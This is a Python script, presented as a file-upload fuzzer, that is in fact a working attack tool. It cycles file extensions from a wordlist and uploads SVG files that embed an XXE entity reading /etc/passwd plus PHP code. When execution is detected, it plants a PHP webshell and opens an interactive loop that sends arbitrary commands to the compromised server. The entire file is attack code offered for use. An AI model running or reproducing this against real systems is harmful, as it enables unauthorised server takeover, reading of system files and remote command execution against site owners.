import requests
import argparse
import urllib.parse

# PAYLOADS
TEST_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

<?php system('echo "XXEC"'); ?>
"""

ATTACK_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

<?php system($_REQUEST['cmd']); ?>
"""

MATCH = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

XXEC
"""

HEADERS = {
    "X-Requested-With": "XMLHttpRequest",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept": "*/*",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

def upload_payload(url, filename, payload):
    files = {"uploadFile": (filename, payload, "image/svg+xml")}
    try:
        response = requests.post(url, files=files, headers=HEADERS, timeout=10)
        if response.status_code == 200:
            print(f"[UPLOAD SUCCESS] {filename} -> Checking execution...")
            return filename
        else:
            print(f"[UPLOAD FAILED] {filename} -> Status Code: {response.status_code}")
    except requests.RequestException as e:
        print(f"[ERROR] Upload failed for {filename}: {e}")
    return None

def check_execution(url, filename):
    check_url = f"{url}{filename}"
    print(f"Check URL: {check_url}")
    try:
        response = requests.get(check_url, timeout=10)
        if response.status_code in [404, 403]:
            print(f"Response Status: {response.status_code}")
            return False
        if MATCH == response.text:
            print(f"[CODE EXECUTION] SUCCESS: {check_url}")
            return True
        else:
            print(f"[NO EXECUTION] Uploaded but did not execute: {check_url}")
    except requests.RequestException as e:
        print(f"[ERROR] Execution check failed for {check_url}: {e}")
    return False

def execute_command(base_url, filename):
    """Prompts the user for a command to execute via the uploaded webshell."""
    while True:
        cmd = input("Enter command to execute (or type 'exit' to stop): ")
        if cmd.lower() == "exit":
            break
        cmd_url = f"{base_url}{filename}?cmd={urllib.parse.quote(cmd)}"
        try:
            response = requests.get(cmd_url, timeout=10)
            output_lines = response.text.strip().split("\n")
            
            # Remove XML/XXE lines if present
            filtered_output = "\n".join(output_lines[3:]) if len(output_lines) > 3 else response.text.strip()
            
            print(f"[COMMAND OUTPUT]\n{filtered_output}")
        except requests.RequestException as e:
            print(f"[ERROR] Command execution failed: {e}")

def extract_url_parts(url):
    parsed_url = urllib.parse.urlparse(url)
    
    scheme = parsed_url.scheme
    host = parsed_url.netloc
    
    if host and scheme:
        return f"{scheme}://{host}"
    else:
        return None

def main():
    parser = argparse.ArgumentParser(description="File Upload Fuzzer")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to wordlist file")
    parser.add_argument("-c","--check", required=True, help="Directory to check")
    parser.add_argument("-u","--url", required=True, help="Host url")
    args = parser.parse_args()

    base_url = args.url
    check_base_url = f"{extract_url_parts(base_url)}/{args.check}"
    payload = TEST_PAYLOAD  
    
    with open(args.wordlist, "r") as f:
        extensions = [line.strip() for line in f.readlines()]
    
    total = len(extensions)
    executed_files = []
    for i, ext in enumerate(extensions, 1):
        print(f"\n[TEST {i}/{total}] Trying extension: {ext}")
        filename = f"test{ext}"
        uploaded_file = upload_payload(base_url, filename, payload)
        if uploaded_file and check_execution(check_base_url, filename):
            executed_files.append(filename)
            choice = input("\n[!] Detected execution. Deploy attack payload? (y/n): ")
            if choice.lower() == 'y':
                filename = f"shell{ext}"
                attack_file = upload_payload(base_url, filename, ATTACK_PAYLOAD)
                if attack_file:
                    print(f"[+] Webshell uploaded: {check_base_url}{attack_file}")
                    execute_command(check_base_url, attack_file)
                    input("Press Enter to continue fuzzing or Ctrl+C to exit...")
    
    print("\n[*] Fuzzing completed.")
    print(f"[*] {len(executed_files)}/{total} payloads executed successfully.")
    if executed_files:
        print("[+] Executed Files:")
        for file in executed_files:
            print(f"    - {check_base_url}{file}")

if __name__ == "__main__":
    main()
